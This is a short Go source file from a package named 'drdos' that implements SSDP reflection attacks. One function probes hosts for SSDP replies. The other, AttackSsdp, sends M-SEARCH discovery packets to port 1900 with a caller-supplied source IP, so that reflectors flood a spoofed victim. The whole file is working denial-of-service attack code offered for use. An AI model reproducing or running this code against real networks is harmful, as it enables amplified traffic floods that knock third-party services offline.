package drdos

import (
	"drdos/config"
	"drdos/utils"
)

func CheckSsdp(dstip string, srcip string) error {
	payload := []byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST:ssdp:all\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\n\r\n")
	dport := 1900
	return utils.SendUdpPack(dstip, srcip, dport, config.ListenPort, payload)
}

func AttackSsdp(dstip string, srcip string, port int) error {
	payload := []byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\nST:ssdp:all\r\n\r\n")
	dport := 1900
	return utils.SendUdpPack(dstip, srcip, dport, port, payload)
}
